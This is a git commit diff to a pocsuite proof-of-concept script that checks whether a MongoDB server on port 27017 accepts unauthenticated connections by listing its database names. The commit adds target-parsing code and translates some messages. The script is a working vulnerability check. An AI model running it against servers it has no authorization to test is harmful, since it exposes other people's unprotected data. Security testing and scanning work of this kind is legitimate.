d8fec36b6f3d1a22085a3702ac634d6918b76622
test <test>
2023-01-30 04:17:15 +0000

    auto updated

--- poc/MongoDB_190528_Unauthorized.py
+++ poc/MongoDB_190528_Unauthorized.py
@@ -4,30 +4,44 @@
 import sys
 reload(sys)
 sys.setdefaultencoding('utf8')
-import pymongo
+from pymongo import MongoClient
 from pocsuite.api.poc import POCBase, Output
 from pocsuite.api.poc import register
 
 
 class TestPOC(POCBase):
-    name = 'MongoDB未授权访问'
     vulID = '78176'  # https://www.seebug.org/vuldb/ssvid-78176
-    author = ['zeal']
-    vulType = 'Unauthorized'
-    version = '1.0'    # default version: 1.0
-    references = ['http://www.s3cur1ty.de/m1adv2013-003']
-    desc = '无需授权任意访问MongoDB服务'
-
+    version = '1.0'
+    author = 'zeal'
     vulDate = '2013-02-14'
     createDate = '2013-02-14'
     updateDate = '2013-02-14'
-
+    references = ['http://www.s3cur1ty.de/m1adv2013-003']
+    name = 'MongoDB Unauthorized'
+    appPowerLink = ''
     appName = 'MongoDB'
     appVersion = 'All'
-    appPowerLink = ''
-    samples = ['']
+    vulType = 'Unauthorized'
+    desc = 'MongoDB 默认没有开启相关认证, 黑客直接访问即可获取数据库中所有信息.'
+    samples = []
     defaultPorts = [27017]
     defaultService = ['mongo', 'mongodb']
+
+    def parse_target(self, target, default_port):
+        schema = 'http'
+        port = default_port
+        address = ''
+        if '://' in target:
+            slices = target.split('://')
+            schema = slices[0]
+            target = slices[1]
+        if ':' in target:
+            slices = target.split(':')
+            address = slices[0]
+            port = slices[1]
+        else:
+            address = target
+        return {'schema': schema, 'address': address, 'port': int(port)}
 
     def _attack(self):
         '''attack mode'''
@@ -37,28 +51,25 @@ class TestPOC(POCBase):
         '''verify mode'''
         result = {}
         try:
-            target_ip = self.target.split(':')[0].strip('/')
-            if len(self.target.split(':')) > 1:
-                target_port = int(self.target.split(':')[1].strip('/'))
-            else:
-                target_port = 27017
-            connection = pymongo.MongoClient(target_ip, target_port, socketTimeoutMS=3000)
+            target = self.parse_target(self.target, 27017)
+            # connection = pymongo.MongoClient(target['address'], target['port'], socketTimeoutMS=3000)
+            connection = MongoClient(target['address'], port=target['port'], connect=False)
             dbs = connection.database_names()
             if dbs:
                 result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = '%s:%i存在MongoDB未授权' % (target_ip, target_port)
+                result['VerifyInfo']['URL'] = '%s:%i存在MongoDB未授权' % (target['address'], target['port'])
         except Exception as e:
             print e
-            result = {}
 
         return self.parse_output(result)
 
     def parse_output(self, result):
+        print 'parse_output'
         output = Output(self)
         if result:
             output.success(result)
         else:
-            output.fail('失败')
+            output.fail('failed connect')
         return output
 
 
